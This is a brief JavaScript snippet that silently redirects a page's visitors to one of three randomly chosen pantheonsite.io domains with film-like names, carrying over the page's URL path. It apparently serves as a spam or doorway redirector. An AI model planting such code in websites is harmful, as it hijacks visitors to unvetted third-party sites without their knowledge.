var urlmain = document.URL;
var param = document.URL.split("/")[3].replace("?m=1","").replace("?m=0","");
var dataUrl = [
"https://dev-carfilms1.pantheonsite.io/",
"https://dev-filmflixss12.pantheonsite.io/",
"https://dev-cusfilms1.pantheonsite.io/"
];
var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
window.location = randomItem + param;
